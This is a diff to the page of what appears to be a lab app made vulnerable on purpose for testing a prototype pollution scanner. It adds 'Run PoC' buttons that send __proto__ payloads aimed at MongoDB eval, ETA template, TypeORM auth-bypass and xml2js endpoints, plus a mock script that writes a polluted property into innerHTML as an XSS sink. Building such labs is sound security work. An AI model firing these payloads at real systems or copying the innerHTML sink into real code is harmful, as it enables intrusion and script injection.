@@ -228,6 +228,42 @@
                 <button class="test-btn" onclick='runTest(this, "/api/blitzjs", "POST", {"json":{"__proto__":{"shell":"vim"}}})'>Run PoC</button>
                 <div class="result-box"></div>
             </div>
+            
+            <div class="endpoint">
+                <span class="tier-badge tier-6">Phase 10</span>
+                <h3>POST /api/v1/bson-eval</h3>
+                <p>MongoDB evalFunctions RCE</p>
+                <code>{"__proto__":{"evalFunctions":true}}</code>
+                <button class="test-btn" onclick='runTest(this, "/api/v1/bson-eval", "POST", {"__proto__":{"evalFunctions":true,"$where":"id"}})'>Run PoC</button>
+                <div class="result-box"></div>
+            </div>
+
+            <div class="endpoint">
+                <span class="tier-badge tier-6">Phase 10</span>
+                <h3>POST /api/v1/eta-render</h3>
+                <p>ETA Template Engine RCE</p>
+                <code>{"__proto__":{"varName":"x=1"}}</code>
+                <button class="test-btn" onclick='runTest(this, "/api/v1/eta-render", "POST", {"__proto__":{"varName":"x=1"}})'>Run PoC</button>
+                <div class="result-box"></div>
+            </div>
+
+            <div class="endpoint">
+                <span class="tier-badge tier-6">Phase 10</span>
+                <h3>POST /api/v1/typeorm-auth</h3>
+                <p>TypeORM Auth Bypass</p>
+                <code>{"__proto__":{"where":{"1":"1"}}}</code>
+                <button class="test-btn" onclick='runTest(this, "/api/v1/typeorm-auth", "POST", {"__proto__":{"where":{"1":"1"}}})'>Run PoC</button>
+                <div class="result-box"></div>
+            </div>
+
+            <div class="endpoint">
+                <span class="tier-badge tier-6">Phase 10</span>
+                <h3>POST /api/v1/xml2js</h3>
+                <p>xml2js Prototype Pollution</p>
+                <code>&lt;__proto__&gt;&lt;polluted&gt;true&lt;/polluted&gt;&lt;/__proto__&gt;</code>
+                <button class="test-btn" onclick='runTest(this, "/api/v1/xml2js", "POST", "<__proto__><polluted>true</polluted></__proto__>")'>Run PoC</button>
+                <div class="result-box"></div>
+            </div>
         </div>
 
         <h2>🧪 Testing with PPMAP</h2>
@@ -258,7 +294,12 @@ python3 ppmap.py --scan http://localhost:3000 --browser chrome
                     headers: { 'Content-Type': 'application/json' }
                 };
                 if (method === 'POST') {
-                    options.body = JSON.stringify(body);
+                    if (typeof body === 'string') {
+                        options.headers['Content-Type'] = 'application/xml';
+                        options.body = body;
+                    } else {
+                        options.body = JSON.stringify(body);
+                    }
                 }
                 
                 const response = await fetch(url, options);
@@ -287,6 +328,16 @@ python3 ppmap.py --scan http://localhost:3000 --browser chrome
 
             // Simulate jQuery extend vulnerability
             $.extend(true, {}, <%= JSON.stringify(query) %>);
+            
+            // Phase 10: Mock Akamai BoT script simulating Client-Side Gadget
+            setTimeout(() => {
+                if (Object.prototype.ak_bmsc) {
+                    console.error("Akamai BoT XSS Gadget Triggered!", Object.prototype.ak_bmsc);
+                    const container = document.createElement("div");
+                    container.innerHTML = Object.prototype.ak_bmsc;
+                    document.body.appendChild(container);
+                }
+            }, 1000);
         });
     </script>
 </body>
